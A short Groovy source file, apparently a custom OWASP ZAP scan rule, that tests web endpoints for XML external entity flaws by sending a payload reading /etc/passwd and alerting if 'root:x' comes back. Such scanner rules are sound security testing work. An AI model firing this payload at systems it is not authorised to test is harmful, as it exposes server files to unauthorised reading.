import org.zaproxy.zap.extension.ascan.ActiveScanRule
import org.parosproxy.paros.network.HttpMessage
import org.parosproxy.paros.core.scanner.Alert

class XXERule extends ActiveScanRule {
    @Override
    public void scan(HttpMessage msg, String param, String value) {
        def xxePayload = """<?xml version="1.0"?>
        <!DOCTYPE foo [<!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        def newMsg = msg.cloneRequest()
        newMsg.getRequestBody().setBody(xxePayload)
        sendAndReceive(newMsg, false)
        if (newMsg.getResponseBody().toString().contains("root:x")) {
            bingo(Alert.RISK_HIGH, Alert.CONFIDENCE_MEDIUM, "XXE Vulnerability", "XML External Entity vulnerability detected.", newMsg.getRequestHeader().getURI().toString(), param, value, xxePayload, "", newMsg)
        }
    }
}
